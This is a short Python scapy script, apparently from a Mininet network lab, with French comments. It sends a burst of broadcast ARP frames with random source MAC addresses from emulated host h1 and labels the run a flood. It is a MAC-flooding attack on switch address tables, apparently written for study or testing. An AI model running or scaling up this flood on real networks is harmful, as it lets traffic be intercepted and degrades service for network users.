#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
import time

# Le nom de l'interface de l'hôte h1, comme confirmé par ifconfig
iface = "h1-eth0" 

num_packets = 50 # Le nombre de paquets à envoyer

# On utilise des chaînes de caractères sans accents pour éviter tout problème d'encodage
print(f"Envoi de {num_packets} paquets avec des adresses MAC aleatoires sur l'interface {iface}...")

for i in range(num_packets):
    # Création d'une adresse MAC source aléatoire
    random_mac = RandMAC()
    # Création d'un paquet Ethernet de couche 2 avec la MAC aléatoire
    packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / ARP()
    
    # Envoi du paquet sur l'interface spécifiée
    sendp(packet, iface=iface, verbose=False)
    
    # Petite pause pour ne pas surcharger le CPU
    time.sleep(0.01)

print("Flood termine.")